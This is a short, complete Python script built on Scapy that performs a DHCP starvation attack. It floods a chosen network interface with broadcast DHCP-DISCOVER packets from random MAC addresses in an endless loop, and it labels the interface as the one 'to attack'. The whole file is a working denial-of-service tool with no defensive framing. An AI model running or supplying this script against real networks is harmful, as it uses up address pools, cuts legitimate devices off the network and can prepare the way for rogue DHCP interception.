#!/usr/bin/env python3

#Import Scapy & DHCP
from scapy.all import *
from scapy.layers.dhcp import *
import argparse

conf.checkIPaddr = False

L2Broadcast = "FF:FF:FF:FF:FF:FF"
L3Broadcast = "255.255.255.255"

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", dest="interface", type=str, required=True, help="Choose the interface to attack")
    args = parser.parse_args()
    return args
    


def malicious_dhcp(interface):
    malicious_dhcp_discover = Ether(src=RandMAC(), dst=L2Broadcast)
    malicious_dhcp_discover /= IP(src='0.0.0.0',dst=L3Broadcast)
    malicious_dhcp_discover /= UDP(sport=68, dport=67)
    malicious_dhcp_discover /= BOOTP(op=1, chaddr = RandMAC())
    malicious_dhcp_discover /= DHCP(options=[('message-type', 'discover'),('end')])
    print ("Sending malicious DHCP-DISCOVER requests...")
    sendp(malicious_dhcp_discover, iface=args.interface, loop=1, verbose=1)


args = get_arguments()
malicious_dhcp(args.interface)

